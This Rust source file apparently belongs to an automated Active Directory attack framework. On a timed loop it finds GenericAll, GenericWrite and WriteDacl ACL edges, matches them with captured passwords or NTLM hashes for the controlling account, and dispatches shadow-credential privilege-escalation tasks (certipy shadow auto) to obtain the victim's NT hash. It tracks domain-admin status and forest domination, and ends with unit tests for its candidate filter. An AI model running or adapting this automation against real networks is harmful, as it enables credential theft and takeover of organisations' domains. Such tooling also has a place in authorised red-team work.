//! auto_shadow_credentials -- exploit GenericAll/WriteDacl ACL edges via shadow credentials.
//!
//! When BloodHound or ACL analysis discovers that a controlled user has
//! GenericAll, GenericWrite, or WriteDacl on another user/computer, this
//! automation dispatches `certipy shadow auto` to add shadow credentials
//! and obtain the target's NT hash without touching LSASS.

use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{debug, info, warn};

use crate::orchestrator::dispatcher::Dispatcher;

/// Dedup key prefix for shadow credential attacks.
const DEDUP_SHADOW_CREDS: &str = "shadow_creds";

/// Monitors for GenericAll/WriteDacl edges and dispatches shadow credential attacks.
/// Interval: 30s.
pub async fn auto_shadow_credentials(
    dispatcher: Arc<Dispatcher>,
    mut shutdown: watch::Receiver<bool>,
) {
    let mut interval = tokio::time::interval(Duration::from_secs(30));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        if !dispatcher.is_technique_allowed("shadow_credentials") {
            continue;
        }

        // Skip when fully dominated and strategy says stop.
        {
            let state = dispatcher.state.read().await;
            if state.has_domain_admin
                && state.all_forests_dominated()
                && !dispatcher.config.strategy.should_continue_after_da()
            {
                continue;
            }
        }

        let work: Vec<ShadowCredWork> = {
            let state = dispatcher.state.read().await;

            state
                .discovered_vulnerabilities
                .values()
                .filter_map(|vuln| {
                    // Look for ACL-based vulns that grant write access to another principal
                    if !is_shadow_cred_candidate(&vuln.vuln_type) {
                        return None;
                    }

                    if state.exploited_vulnerabilities.contains(&vuln.vuln_id) {
                        return None;
                    }

                    let dedup_key = format!("{DEDUP_SHADOW_CREDS}:{}", vuln.vuln_id);
                    if state.is_processed(DEDUP_SHADOW_CREDS, &dedup_key) {
                        return None;
                    }

                    // Extract source (attacker) and target (victim) from vuln details
                    let source_user = vuln
                        .details
                        .get("source")
                        .or_else(|| vuln.details.get("source_user"))
                        .or_else(|| vuln.details.get("attacker"))
                        .and_then(|v| v.as_str())
                        .map(|s| s.to_string())?;

                    let target_user = vuln
                        .details
                        .get("target")
                        .or_else(|| vuln.details.get("target_user"))
                        .or_else(|| vuln.details.get("victim"))
                        .or_else(|| vuln.details.get("account_name"))
                        .and_then(|v| v.as_str())
                        .map(|s| s.to_string())?;

                    let domain = vuln
                        .details
                        .get("domain")
                        .and_then(|v| v.as_str())
                        .unwrap_or("")
                        .to_string();

                    // Find credential for the source user
                    let credential = state
                        .credentials
                        .iter()
                        .find(|c| {
                            c.username.to_lowercase() == source_user.to_lowercase()
                                && (domain.is_empty()
                                    || c.domain.to_lowercase() == domain.to_lowercase())
                        })
                        .cloned();

                    // Also check for NTLM hash as fallback
                    let hash = if credential.is_none() {
                        state
                            .hashes
                            .iter()
                            .find(|h| {
                                h.username.to_lowercase() == source_user.to_lowercase()
                                    && h.hash_type.to_uppercase() == "NTLM"
                                    && (domain.is_empty()
                                        || h.domain.to_lowercase() == domain.to_lowercase())
                            })
                            .cloned()
                    } else {
                        None
                    };

                    if credential.is_none() && hash.is_none() {
                        debug!(
                            vuln_id = %vuln.vuln_id,
                            source = %source_user,
                            "Shadow credentials skipped: no cred/hash for source user"
                        );
                        return None;
                    }

                    let dc_ip = state
                        .domain_controllers
                        .get(&domain.to_lowercase())
                        .cloned();

                    Some(ShadowCredWork {
                        vuln_id: vuln.vuln_id.clone(),
                        dedup_key,
                        source_user,
                        target_user,
                        domain,
                        dc_ip,
                        credential,
                        hash,
                    })
                })
                .collect()
        };

        for item in work {
            let mut payload = json!({
                "technique": "shadow_credentials",
                "vuln_type": "shadow_credentials",
                "vuln_id": item.vuln_id,
                "target_account": item.target_user,
                "domain": item.domain,
            });

            if let Some(ref dc) = item.dc_ip {
                payload["target_ip"] = json!(dc);
                payload["dc_ip"] = json!(dc);
            }

            if let Some(ref cred) = item.credential {
                payload["username"] = json!(cred.username);
                payload["password"] = json!(cred.password);
                payload["credential"] = json!({
                    "username": cred.username,
                    "password": cred.password,
                    "domain": cred.domain,
                });
            } else if let Some(ref hash) = item.hash {
                payload["username"] = json!(hash.username);
                payload["hash"] = json!(hash.hash_value);
            }

            let priority = dispatcher.effective_priority("shadow_credentials");
            match dispatcher
                .throttled_submit("exploit", "privesc", payload, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        vuln_id = %item.vuln_id,
                        source = %item.source_user,
                        target = %item.target_user,
                        "Shadow credentials attack dispatched"
                    );
                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_SHADOW_CREDS, item.dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_SHADOW_CREDS, &item.dedup_key)
                        .await;
                }
                Ok(None) => {}
                Err(e) => {
                    warn!(err = %e, vuln_id = %item.vuln_id, "Failed to dispatch shadow credentials")
                }
            }
        }
    }
}

struct ShadowCredWork {
    vuln_id: String,
    dedup_key: String,
    source_user: String,
    target_user: String,
    domain: String,
    dc_ip: Option<String>,
    credential: Option<ares_core::models::Credential>,
    hash: Option<ares_core::models::Hash>,
}

/// Returns `true` if the given vulnerability type is a candidate for shadow
/// credentials exploitation (ACL-based write access on another principal).
pub(crate) fn is_shadow_cred_candidate(vuln_type: &str) -> bool {
    matches!(
        vuln_type.to_lowercase().as_str(),
        "genericall"
            | "genericwrite"
            | "writedacl"
            | "writeowner"
            | "shadow_credentials"
            | "acl_genericall"
            | "acl_genericwrite"
            | "acl_writedacl"
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_is_shadow_cred_candidate_positive() {
        assert!(is_shadow_cred_candidate("genericall"));
        assert!(is_shadow_cred_candidate("GenericAll"));
        assert!(is_shadow_cred_candidate("genericwrite"));
        assert!(is_shadow_cred_candidate("writedacl"));
        assert!(is_shadow_cred_candidate("writeowner"));
        assert!(is_shadow_cred_candidate("shadow_credentials"));
        assert!(is_shadow_cred_candidate("acl_genericall"));
        assert!(is_shadow_cred_candidate("acl_genericwrite"));
        assert!(is_shadow_cred_candidate("acl_writedacl"));
    }

    #[test]
    fn test_is_shadow_cred_candidate_negative() {
        assert!(!is_shadow_cred_candidate("rbcd"));
        assert!(!is_shadow_cred_candidate("esc1"));
        assert!(!is_shadow_cred_candidate("mssql_access"));
        assert!(!is_shadow_cred_candidate("unconstrained_delegation"));
        assert!(!is_shadow_cred_candidate("genericall_computer"));
        assert!(!is_shadow_cred_candidate(""));
    }

    #[test]
    fn test_is_shadow_cred_candidate_case_insensitive() {
        assert!(is_shadow_cred_candidate("GENERICALL"));
        assert!(is_shadow_cred_candidate("WriteDacl"));
        assert!(is_shadow_cred_candidate("ACL_GENERICWRITE"));
    }

    #[test]
    fn test_dedup_key_format() {
        let vuln_id = "vuln-456";
        let dedup_key = format!("{DEDUP_SHADOW_CREDS}:{vuln_id}");
        assert_eq!(dedup_key, "shadow_creds:vuln-456");
    }
}
